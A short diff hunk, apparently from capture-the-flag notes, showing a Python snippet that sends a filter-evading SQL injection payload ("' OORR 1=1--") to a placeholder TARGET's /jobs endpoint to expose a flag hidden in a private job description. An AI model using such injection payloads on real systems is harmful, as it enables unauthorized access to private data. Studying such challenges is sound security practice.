@@ -46,4 +46,3 @@ tricks:
       import requests
       resp = requests.post('http://TARGET/jobs', json={"job_type": "' OORR 1=1--"})
       print(resp.json())  # FLAG in private job description
-
